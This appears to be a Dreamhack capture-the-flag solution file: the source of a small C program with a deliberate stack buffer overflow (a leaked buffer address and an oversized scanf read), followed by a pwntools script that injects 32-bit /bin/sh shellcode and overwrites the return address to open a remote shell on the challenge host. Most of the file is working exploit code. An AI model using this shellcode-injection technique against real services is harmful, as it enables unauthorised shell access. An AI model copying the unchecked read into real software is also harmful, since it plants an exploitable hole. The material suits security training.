#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    printf("buf = (%p)\n", buf);
    scanf("%141s", buf);

    return 0;
}

from pwn import *
exe = ELF("./basic_exploitation_000")
# r = process(exe.path)
r = remote("host3.dreamhack.games", 10358)
# gdb.attach(r, gdbscript='''
#            b* main+42
#            c
#            ''')

input()
r.recvuntil(b'(')
leak_stack = r.recv(10).decode()
log.info("leak stack: " + leak_stack)

leak_stack = int(leak_stack, 16)

# shellcode = asm(
#     '''
#     xor    eax,eax
#     push   eax
#     push   0x68732f6e
#     push   0x69622f2f
#     mov    ebx,esp
#     xor    ecx,ecx
#     xor    edx,edx
#     mov    al,0x8
#     inc    eax
#     inc    eax
#     inc    eax
#     int    0x80
#      ''', arch = "amd64"
#     )
shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
payload = shellcode
payload = payload.ljust(132, b"a")
payload += p32(leak_stack)
r.sendlineafter(b")\n", payload)

r.interactive()
